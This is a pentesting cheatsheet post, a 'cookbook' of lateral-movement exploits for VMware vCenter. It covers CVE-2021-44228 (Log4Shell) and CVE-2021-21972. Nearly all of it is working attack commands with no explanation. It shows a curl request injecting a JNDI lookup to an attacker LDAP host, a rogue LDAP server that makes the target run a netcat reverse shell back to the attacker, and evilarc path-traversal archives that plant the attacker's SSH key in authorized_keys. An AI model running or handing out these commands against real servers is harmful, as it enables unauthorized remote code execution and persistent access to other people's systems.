---
layout: post
title: TA0008 Lateral Movement - T1210 Remote Services Exploits 2021 - Cookbook 
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2022-02-14
permalink: /:categories/:title/
---

<!-- vscode-markdown-toc -->
* 1. [CVE-2021-44228 - VCenter](#CVE-2021-44228-VCenter)
* 2. [CVE-2021-21972 - VCenter](#CVE-2021-21972-VCenter)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

##  1. <a name='CVE-2021-44228-VCenter'></a>CVE-2021-44228 - VCenter

```
# install
git clone https://github.com/veracode-research/rogue-jndi.git
apt install default-jdk
apt install java-common
apt install java-package

# check if Vcenter version is vulnerable
curl -ski https://1.2.3.4/ui/login | grep Location

# tmux windows 0 splitting
Ctrl-b %
Ctrl-b ->
Ctrl-b "

## cmds to run consequently in tmux windows 1, 2 and 3 

# HOOK STEP 1: rogue CURL query that hook VCenter to make an LDAP query 
curl --insecure  -vv -H "X-Forwarded-For: \${jndi:ldap://1.1.1.1:1389/o=tomcat}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

# HOOK STEP 2: run a rogue LDAP server that hook VCenter, executing netcat back to us 
sudo java -jar target/RogueJndi-1.1.jar --command "nc -e /bin/bash 1.1.1.1 4242" --hostname "1.1.1.1"

# CHECK: 1/ the LDAP, and 2/ the netcat, hooks come back
sudo tcpdump -ni eth0 host 1.2.3.4

# tmux windows 1 splitting
Ctrl-b c
Ctrl-b %
Ctrl-b ->
Ctrl-b "

# REVERSE SHELL: 
nc -lvnp 4242
```

##  2. <a name='CVE-2021-21972-VCenter'></a>CVE-2021-21972 - VCenter
```
sudo python3 CVE-2021-21972.py -t 1.2.3.3 -f /root/.ssh/id_rsa.pub -p /home/vsphere-ui/.ssh/authorized_keys -o unix
git clone https://github.com/ptoomey3/evilarc.git
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar home/vsphere-ui/.ssh
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar home/vsphere-ui/.ssh/id_rsa.pub
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar /home/vsphere-ui/.ssh/id_rsa.pub
python evilarc.py -d 5 -p '/home/vsphere-ui/.ssh' -o unix -f linexpl.tar /home/vsphere-ui/.ssh/id_rsa.pub
cd ../CVE-2021-21972/
sudo python3 CVE-2021-21972.py -t 1.2.3.3
python3 CVE-2021-21972.py -t 1.2.3.3
python3 CVE-2021-21972.py -t 1.2.3.4
```